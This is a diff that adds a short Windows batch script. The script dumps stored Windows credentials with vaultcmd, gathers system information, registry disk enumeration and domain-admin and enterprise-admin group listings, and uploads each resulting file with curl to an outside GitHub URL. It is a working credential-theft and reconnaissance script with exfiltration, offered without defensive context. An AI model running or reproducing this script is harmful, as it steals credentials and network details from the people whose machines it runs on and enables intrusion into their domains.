@@ -1,0 +1,13 @@
+@echo off
+mkdir "%tmp%\recon"
+vaultcmd /listcreds:"Windows Credentials" > "%tmp%/recon/Credentials.txt"
+systeminfo > "%tmp%/systeminfo.txt"
+reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum > "%tmp%/recon/Enum.txt"
+net localgroup > "%tmp%/recon/Groups Discovery Windows.txt"
+net group /domain >> "%tmp%/recon/Groups Discovery Windows.txt"
+net group "domain admins" /domain >> "%tmp%/recon/Groups Discovery Windows.txt"
+net group "enterprise admins" /domain >> "%tmp%/recon/Groups Discovery Windows.txt"
+Curl -T "%tmp%/recon/Credentials.txt" https://github.com/tlor89/test/
+Curl -T "%tmp%/systeminfo.txt" https://github.com/tlor89/test/
+Curl -T "%tmp%/recon/Enum.txt" https://github.com/tlor89/test/
+Curl -T "%tmp%/recon/Groups Discovery Windows.txt" https://github.com/tlor89/test/
